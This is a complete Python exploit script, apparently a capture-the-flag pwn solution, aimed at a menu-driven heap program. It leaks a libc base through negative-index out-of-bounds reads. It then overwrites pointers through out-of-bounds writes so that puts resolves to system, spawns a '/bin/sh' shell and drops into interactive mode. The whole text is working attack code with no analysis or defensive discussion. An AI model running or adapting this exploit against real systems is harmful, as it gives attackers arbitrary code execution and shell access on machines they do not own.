#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def delet(idx):
    sl(i2b(0x1919))
    sl(i2b(idx))


def edit(idx, data):
    sl(i2b(0x810))
    sl(i2b(idx))
    sl(data)


def add(idx, size):
    sl(i2b(0x114))
    sl(i2b(idx))
    sl(i2b(size))


def show(idx):
    sl(i2b(0x514))
    sl(i2b(idx))


# STEP 0: leak libc address
show(0 - (0x4040A0 - 0x3FE530) // 8 // 2)
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1D4780
lg("libc_base", libc_base)

ptr2388 = 0x3FE0F8 - 8
target = 0x3FE388 + 8

add(0, 0x100)
sl(b"/bin/sh\x00")

edit(
    0 - (0x4040A0 - ptr2388) // 8 // 2,
    flat(
        [
            0x1337,
            0x1337,
            elf.got.puts,
        ]
    ),
)

edit(0 - (0x4040A0 - target) // 8 // 2, p64(libc_base + libc.sym.system))
show(0)

ia()
